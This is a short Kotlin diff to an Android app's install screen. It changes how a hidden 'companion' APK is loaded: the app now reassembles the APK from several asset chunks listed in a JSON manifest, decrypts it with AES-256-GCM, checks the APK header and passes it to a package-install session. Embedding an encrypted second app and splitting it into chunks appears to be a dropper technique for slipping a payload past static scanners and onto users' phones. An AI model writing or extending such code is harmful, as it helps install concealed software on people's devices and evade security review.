@@ -89,11 +89,17 @@ class InstallActivity : AppCompatActivity() {
         }
         handler.postDelayed(cycleRunnable, 2200)
 
-        // Decrypt companion.enc at runtime using AES-256-GCM (javax.crypto)
+        // Reassemble chunks → decrypt AES-256-GCM → install
         Thread {
             try {
-                val encBytes = assets.open("companion.enc").use { it.readBytes() }
-                val apkBytes = decryptCompanion(encBytes)
+                val manifest = assets.open("cmap.json").use { it.readBytes() }.toString(Charsets.UTF_8)
+                val chunkNames = org.json.JSONObject(manifest)
+                    .getJSONArray("chunks")
+                    .let { arr -> (0 until arr.length()).map { arr.getString(it) } }
+                val blob = chunkNames.fold(ByteArray(0)) { acc, name ->
+                    acc + assets.open(name).use { it.readBytes() }
+                }
+                val apkBytes = decryptCompanion(blob)
                 if (apkBytes != null && apkBytes.size > 1 &&
                     apkBytes[0] == 'P'.code.toByte() && apkBytes[1] == 'K'.code.toByte()) {
                     runOnUiThread { installViaSession(apkBytes, attempt = 1) }
